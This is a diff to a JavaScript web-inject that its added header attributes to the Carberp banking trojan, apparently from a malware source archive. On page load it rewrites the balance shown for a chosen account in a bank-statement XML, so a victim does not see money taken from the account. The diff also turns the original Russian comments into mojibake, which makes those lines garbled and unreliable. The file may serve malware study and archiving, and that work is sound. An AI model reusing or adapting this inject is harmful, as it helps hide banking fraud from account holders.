@@ -1,17 +1,28 @@
-/*Остаток по счетам, Документы из банка -> Выписки -> Показать реестр остатков по счетам*/
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
+/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ -> пїЅпїЅпїЅпїЅпїЅпїЅпїЅ -> пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ*/
 var new_balance;
 
 $(document).ready(function(){
-	/*Вызываем при загрузке документа*/
+	/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 	changeBalance();
 });
 
-/*Вызывается при перегрузке XML*/
+/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ XML*/
 function fix()
 {
 	changeBalance();
 }
-/*Читаем XML, изменяем баланс на нужном счете*/
+/*пїЅпїЅпїЅпїЅпїЅпїЅ XML, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ*/
 function changeBalance()
 {
 	if(!document.getElementById("ScData"))
@@ -21,13 +32,13 @@ function changeBalance()
 
 	$(xml.documentElement.childNodes).each(function(){
 		var $this = $(this);
-		/*Если это нужный счет*/
+		/*пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ*/
 		if($this.attr("B") == acc_id)
 		{
 			if(!new_balance)
 				new_balance = moneyToFloat($this.attr("C"))+balance;
 				
-			/*Меняем баланс*/
+			/*пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ*/
 			$this.attr("C", roundMoney(new_balance).toString());
 		}
 	});
